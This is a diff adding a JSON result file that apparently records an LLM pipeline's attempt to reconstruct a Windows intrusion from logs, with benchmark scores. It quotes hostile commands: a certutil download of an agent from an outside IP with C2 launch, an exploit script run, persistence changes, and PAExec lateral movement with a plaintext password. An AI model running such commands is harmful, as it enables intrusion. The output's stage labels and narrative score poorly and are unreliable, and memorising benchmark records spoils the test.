@@ -1,0 +1,104 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "cmd.exe /c \"certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd.exe /c \"start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "\"C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c \"/c echo start:dbb2f234-101f-4f44-bb97-72263635f506\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "Python PhpStudyExp2.py",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyExp2.py'",
+        "stage": "Execution"
+      },
+      {
+        "command": "netsh advfirewall firewall add rule name=\"\", ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg.exe ADD \"HKLM...\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "PAExec.exe \\192.168.0.244 -u administrator -p Data123456!",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /c cmd /c \"cd /d D:/phpStudy/WWW/&netstat -ano | find \\\"88\\\"&echo [S]\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /c cmd /c \"cd /d D:/phpStudy/WWW/&wmic cpu get NumberOfLogicalProcessors&echo [S]\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /c cmd /c \"cd /d D:/phpStudy/WWW/&wmic memorychip get capacity&echo [S]\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "notepad.exe D:\\README.txt",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attack sequence starts with Initial Access through downloaded and executed payloads from remote servers. Execution of scripts like Python and PowerShell indicates further action within the host. Persistence is established via Firewall rules and registry modifications. Credential Access occurs via echoing session identifiers likely tied to stolen accounts. Discovery activities include collecting system and network info. Defense Evasion uses legitimate utilities like Notepad. Lateral Movement happens through PAExec. Command and Control communication is set up with agent executables.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 20104,
+      "completion_tokens": 7814,
+      "total_tokens": 27918,
+      "wall_clock_s": 147.587,
+      "parse_retries": 3
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.15384615384615385,
+      "recall": 0.3333333333333333,
+      "f1": 0.21052631578947367,
+      "tp": 2,
+      "fp": 11,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.07692307692307693,
+      "recall": 0.16666666666666666,
+      "f1": 0.10526315789473684,
+      "tp": 1,
+      "fp": 12,
+      "fn": 5,
+      "recall_partial": 0.25
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 20104,
+      "completion_tokens": 7814,
+      "total_tokens": 27918,
+      "wall_clock_s": 147.587,
+      "parse_retries": 3
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
